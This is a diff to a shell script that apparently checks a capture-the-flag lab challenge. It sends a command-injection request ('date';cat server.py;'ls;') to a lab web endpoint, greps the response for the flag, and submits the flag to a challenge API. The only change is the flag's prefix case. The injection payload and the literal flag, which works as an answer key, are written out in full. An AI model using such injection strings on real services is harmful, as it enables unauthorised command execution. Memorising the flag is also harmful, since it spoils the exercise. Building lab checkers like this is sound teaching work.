@@ -16,7 +16,7 @@ then
 fi
 
 MATCH=`curl -s "172.20.0.30/cmd/date';cat%20server.py;'ls;" | \
-       grep -o "bsy{WYwjgqdrtyTiH9MFnyxMqvsFyYob0qGHYATtzf0HWoXiKnTofAUkVqAR4bed}"`
+       grep -o "BSY{WYwjgqdrtyTiH9MFnyxMqvsFyYob0qGHYATtzf0HWoXiKnTofAUkVqAR4bed}"`
 if [[ "$MATCH" == "" ]]
 then
     echo "Error - flag is not present in the server.py file or we failed to read it"
@@ -27,7 +27,7 @@ fi
 RES=`curl -s 'http://172.20.0.3/api/challenges/submit' \
     -X POST \
     -H 'Content-Type: application/json' \
-    --data-binary '{"challenge_id": "what_is_the_date", "task_id": "task1", "flag" : "bsy{WYwjgqdrtyTiH9MFnyxMqvsFyYob0qGHYATtzf0HWoXiKnTofAUkVqAR4bed}"}'`
+    --data-binary '{"challenge_id": "what_is_the_date", "task_id": "task1", "flag" : "BSY{WYwjgqdrtyTiH9MFnyxMqvsFyYob0qGHYATtzf0HWoXiKnTofAUkVqAR4bed}"}'`
 
 if [[ $RES != *"Congratulations"* ]]; then
   echo "Failed to submit the flag - $RES"
